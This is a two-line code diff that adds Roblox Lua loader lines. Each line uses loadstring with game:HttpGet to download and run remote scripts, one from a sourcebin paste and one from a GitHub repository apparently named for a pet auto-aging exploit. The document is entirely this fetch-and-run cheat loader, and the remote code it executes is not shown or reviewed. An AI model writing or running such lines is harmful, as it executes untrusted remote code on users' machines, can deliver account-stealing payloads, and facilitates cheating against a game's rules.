@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/DOocdAFOfS/0", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WebSploi/PetAutoAge50/refs/heads/main/PetAutoAge50.lua.txt"))()
